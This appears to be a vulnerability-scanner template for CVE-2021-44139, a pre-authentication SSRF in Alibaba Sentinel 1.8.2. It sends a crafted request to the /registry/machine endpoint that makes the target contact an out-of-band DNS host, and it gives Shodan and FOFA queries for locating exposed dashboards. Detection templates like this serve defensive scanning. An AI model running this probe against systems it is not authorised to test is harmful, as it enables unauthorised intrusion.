id: CVE-2021-44139

info:
  name: Alibaba Sentinel - Server-side request forgery (SSRF)
  author: DhiyaneshDK
  severity: high
  description: |-
    There is a Pre-Auth SSRF vulnerability in Alibaba Sentinel version 1.8.2, which allows remote unauthenticated attackers to perform SSRF attacks via the /registry/machine endpoint through the ip parameter.
    shodan: title:"Sentinel Dashboard"
    fofa: title="Sentinel Dashboard"
  tags: cve2021,cve,ssrf,alibaba,misconfig,sentinel,hashicorp
  created: 2024/04/23

set:
  randstr1: randomLowercase(5)
  randstr2: randomLowercase(5)
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: GET
      path: /registry/machine?app={{randstr1}}&appType=0&version=0&hostname={{randstr2}}&ip={{oobDNS}}&port=0
    expression: response.body.bcontains(b'"success":true') && response.body.bcontains(b'"msg":"success"') && oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
